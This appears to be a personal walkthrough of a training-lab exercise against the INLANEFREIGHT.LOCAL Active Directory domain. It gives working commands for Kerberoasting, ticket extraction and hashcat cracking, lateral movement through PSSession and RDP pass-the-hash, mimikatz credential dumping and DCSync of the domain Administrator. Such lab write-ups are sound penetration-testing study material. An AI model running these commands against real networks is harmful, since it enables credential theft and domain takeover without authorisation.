First, once we have a foothold, e.g. a webshell, we can try to stabilize it through a meterpreter shell.
Once we do that we have to check for internal interfaces, to pivot in the internal net.
We can do so by running:

```powershell
ipconfig /all

systeminfo | findstr /i "domain"

nltest /dclist: 

nslookup DC01.INLANEFREIGHT.LOCAL
```

This will give us the ips, domain and DC name.

or: `setspn.exe -Q */*`

This will list a lot of info about the domain. Now we can use setspn.exe to load the tickets into the memory of our session. Based on the output of setspn: 
```Powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL01.inlanefreight.local:1433"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL02.inlanefreight.local:1433"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/SQL-DEV01.inlanefreight.local:1433"
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEVTEST.inlanefreight.local:1433"
```

```Powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Then we can take the base64 hash, decode it and save it:
```bash
# Convert base64 to kirbi
echo "doIGPzCCBjugAwIBBaEDAgEWooIFKDCCBSRhggUgMIIFHKADAgE..." | base64 -d > svc_sql.kirbi

# Extract hash using kirbi2john
python kirbi2john.py svc_sql.kirbi > crack_file

# Modify for hashcat format 
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > svc_sql_hash

# Crack with hashcat
hashcat -m 13100 svc_sql_hash /usr/share/wordlists/rockyou.txt
```

Now, if we want to use these creds to connect to another host from the internal net:
```powershell
Enter-PSSession -ComputerName ms01.inlanefreight.local -Credential (New-Object PSCredential 'svc_sql',(ConvertTo-SecureString 'lucky7' -AsPlainText -Force))
```

Now we can list out what we can do as svc_sql:
```powershell
# Check privileges whoami
/priv
# Check local groups whoami
/groups net localgroup 
# Check domain groups/memberships
net user svc_sql /domain
```

We got RDP rights, we can set up a tunnel and xfreerdp:
```powershell
portfwd add -l 3389 -p 3389 -r 172.16.6.3
```

```powershell
xfreerdp /v:127.0.0.1:3399 /u:Administrator /pth:hash /drive:Downloads,/home/htb-ac-692694/Downloads
```

Now we can move mimikatz on the system and run it as admin and run sekurlsa::msv to get the tickets, we will get tpetty's ticket.
Check what tpetty can do with a tpetty shell:
```powershell
# Using PowerView
$sid = Convert-NameToSid tpetty -Domain "INLANEFREIGHT.LOCAL" Get-DomainObjectACL -Domain "INLANEFREIGHT.LOCAL" "DC=INLANEFREIGHT,DC=LOCAL" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $sid} 
# Look for these rights that allow DCSync: 
# - DS-Replication-Get-Changes # - DS-Replication-Get-Changes-All 
# - DS-Replication-Get-Changes-In-Filtered-Set
#Or use BloodHound to map out if tpetty has DCSync privileges on the domain.
```

Now with the ticket we can try crack it or pth with mimikatz and then do a dcsync.

```powershell
sekurlsa::pth /user:tpetty /domain:INLANEFREIGHT.LOCAL /ntlm:fd37b6fec5704cadabb319cebf9e3a3a

lsadump::dcsync /domain:INLANEFREIGHT.local /user:INLANEFREIGHT\Administrator
```

